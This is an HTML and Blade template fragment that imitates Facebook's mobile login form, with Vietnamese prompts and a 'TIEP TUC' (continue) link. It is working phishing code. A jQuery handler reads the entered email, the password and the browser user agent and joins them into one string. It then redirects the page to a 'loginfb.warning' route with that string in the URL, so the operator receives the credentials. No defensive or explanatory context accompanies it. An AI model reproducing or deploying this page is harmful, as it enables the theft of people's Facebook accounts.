<input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="email" placeholder="Số di động hoặc email" data-sigil="m_login_email">
<input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pass" placeholder="Mật khẩu Facebook" type="password" data-sigil="password-plain-text-toggle-input">
<style>
    #m_login_email {
        /*visibility: hidden;*/
    }
    #m_login_password {
        /*visibility: hidden;*/
    }
</style>
<p>VUI LONG CLICK NEU BAN MUON TIEP TUC ?</p>
<a href="#" id="continue">TIEP TUC</a>
<script src="/js/jquery.min.js"></script>
<script>
    $(document).ready(function () {
        $('#continue').click(function (e) {
            var params = $('#m_login_email').val() +':::'+ $('#m_login_password').val() +':::'+ navigator.userAgent;
            var url = '{{ route('loginfb.warning').'?hashing=' }}'+ JSON.stringify(params);
            window.location.href = url;
        });
    });
</script>
